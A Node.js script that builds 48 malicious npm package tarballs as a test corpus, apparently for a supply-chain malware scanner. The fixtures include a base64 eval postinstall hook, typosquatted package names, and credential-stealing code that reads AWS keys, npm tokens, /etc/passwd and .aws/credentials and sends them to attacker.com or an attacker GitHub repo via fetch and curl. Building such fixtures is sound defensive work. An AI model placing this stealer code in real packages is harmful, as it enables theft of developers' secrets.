import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'fs';
import { execSync } from 'child_process';
import { tmpdir } from 'os';
import { join } from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __dirname = dirname(fileURLToPath(import.meta.url));
const CORPUS_DIR = join(__dirname, '..', 'tests', 'corpus', 'malicious');

const TOP_TYPOS = [
  'reacct', 'expres', 'axiox', 'chlak', 'vuue', 'typescrip',
  'momnet', 'uuuid', 'commnder', 'debuge', 'semverr', 'underscoree',
  'requesst', 'asycn',
];

const BINARY_NAMES = ['bun', 'deno', 'go', 'rustc', 'python'];

function writeFile(filePath, content) {
  writeFileSync(filePath, content, 'utf8');
}

function createElfBinary(size = 4096) {
  const buf = Buffer.alloc(size, 0);
  buf[0] = 0x7f;
  buf[1] = 0x45;
  buf[2] = 0x4c;
  buf[3] = 0x46;
  buf[4] = 2;
  buf[5] = 1;
  buf[6] = 1;
  buf[7] = 0;
  return buf;
}

function createPeBinary(size = 4096) {
  const buf = Buffer.alloc(size, 0);
  buf[0] = 0x4d;
  buf[1] = 0x5a;
  return buf;
}

function buildTarball(dir, tmpParent) {
  const tgzPath = join(CORPUS_DIR, `${dir}.tgz`);
  execSync(`tar czf "${tgzPath}" -C "${tmpParent}" "${dir}"`, { stdio: 'pipe', shell: 'powershell' });
}

function createCampaign1Package(n) {
  const dir = `campaign-1-${String(n).padStart(3, '0')}`;
  const pkgJson = {
    name: `vulnerable-package-${n}`,
    version: '99.0.0',
    description: 'Campaign 1 test fixture',
    repository: { url: 'https://github.enterprise.internal/org/repo' },
    homepage: 'https://jira.internal/browse/PROJ-123',
    bugs: { url: 'https://docs.internal/issues' },
    scripts: {
      postinstall: 'node -e "eval(Buffer.from(\'dmFyIHggPSAx\' ,\'base64\').toString())"',
    },
  };

  const distIndexJs = `(function() {
  const os = require('os');
  const env = process.env;
  const profile = {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    env: { AWS_ACCESS_KEY_ID: env.AWS_ACCESS_KEY_ID }
  };
  console.log('[RECON]', JSON.stringify(profile));
})();`;

  const tmpParent = mkdtempSync(join(tmpdir(), 'camp1-'));
  const pkgDir = join(tmpParent, dir);
  mkdirSync(join(pkgDir, 'dist'), { recursive: true });
  writeFile(join(pkgDir, 'package.json'), JSON.stringify(pkgJson, null, 2));
  writeFile(join(pkgDir, 'dist', 'index.js'), distIndexJs);

  buildTarball(dir, tmpParent);
  rmSync(tmpParent, { recursive: true, force: true });
  console.log(`  Created ${dir}.tgz`);
}

function createCampaign2Package(n) {
  const dir = `campaign-2-${String(n).padStart(3, '0')}`;
  const typoName = TOP_TYPOS[(n - 1) % TOP_TYPOS.length];
  const binName = BINARY_NAMES[(n - 1) % BINARY_NAMES.length];

  const pkgJson = {
    name: typoName,
    version: '1.0.0',
    description: 'Test fixture',
  };

  const distIndexJs = `const fs = require('fs');
const { execSync } = require('child_process');
const awsKey = process.env.AWS_ACCESS_KEY_ID;
const npmToken = process.env.NODE_AUTH_TOKEN;
const data = fs.readFileSync('/etc/passwd', 'utf8');
if (awsKey || npmToken) {
  fetch('https://attacker.com/creds', {
    method: 'POST',
    body: JSON.stringify({ awsKey, npmToken, data })
  });
}`;

  const tmpParent = mkdtempSync(join(tmpdir(), 'camp2-'));
  const pkgDir = join(tmpParent, dir);
  mkdirSync(join(pkgDir, 'dist'), { recursive: true });
  mkdirSync(join(pkgDir, 'bin'), { recursive: true });
  writeFile(join(pkgDir, 'package.json'), JSON.stringify(pkgJson, null, 2));
  writeFile(join(pkgDir, 'dist', 'index.js'), distIndexJs);

  writeFileSync(join(pkgDir, 'bin', binName), createElfBinary(32768));
  writeFileSync(join(pkgDir, 'bin', `${binName}.exe`), createPeBinary(32768));

  buildTarball(dir, tmpParent);
  rmSync(tmpParent, { recursive: true, force: true });
  console.log(`  Created ${dir}.tgz (typo: ${typoName}, binary: ${binName})`);
}

function createCampaign3Package() {
  const dir = 'campaign-3-infostealer';

  const pkgJson = {
    name: 'mouse5212-super-formatter',
    version: '1.0.0',
    description: 'Super formatter',
  };

  const distIndexJs = `const fs = require('fs');
const { execSync } = require('child_process');
const secretFiles = ['package.json', '.env', '.npmrc', '.aws/credentials'];
for (const file of secretFiles) {
  try {
    const content = fs.readFileSync(process.env.HOME + '/' + file, 'utf8');
    const ghToken = 'ghp_stub1234567890abcdefghijklmnopqr';
    const exfilUrl = 'https://api.github.com/repos/attacker/stolen-secrets/contents/data.json';
    execSync('curl -X PUT "' + exfilUrl + '" -H "Authorization: token ' + ghToken + '" -d ' + JSON.stringify(content));
  } catch (e) {
  }
}`;

  const tmpParent = mkdtempSync(join(tmpdir(), 'camp3-'));
  const pkgDir = join(tmpParent, dir);
  mkdirSync(join(pkgDir, 'dist'), { recursive: true });
  writeFile(join(pkgDir, 'package.json'), JSON.stringify(pkgJson, null, 2));
  writeFile(join(pkgDir, 'dist', 'index.js'), distIndexJs);

  buildTarball(dir, tmpParent);
  rmSync(tmpParent, { recursive: true, force: true });
  console.log(`  Created ${dir}.tgz`);
}

// ─── Generate All Campaigns ─────────────────────────────────────────
console.log('Generating Campaign 1 (33 packages)...');
for (let i = 1; i <= 33; i++) {
  createCampaign1Package(i);
}

console.log('Generating Campaign 2 (14 packages)...');
for (let i = 1; i <= 14; i++) {
  createCampaign2Package(i);
}

console.log('Generating Campaign 3 (1 package)...');
createCampaign3Package();

console.log('\nAll 48 campaign tarballs generated successfully!');
